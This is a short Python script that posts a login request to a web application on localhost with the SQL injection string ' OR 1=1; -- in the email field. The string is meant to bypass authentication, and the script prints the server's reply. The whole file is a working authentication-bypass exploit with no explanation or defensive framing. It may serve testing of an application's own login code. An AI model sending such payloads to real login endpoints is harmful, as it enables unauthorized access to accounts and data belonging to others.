import requests

url = "http://localhost:3000/auth/login"
payload = {
    "email": "' OR 1=1; --",
    "password": "irrelevant"
}
headers = {
    "Content-Type": "application/json"
}

response = requests.post(url, json=payload, headers=headers)
print(f"Status Code: {response.status_code}")
print("Response:", response.json())
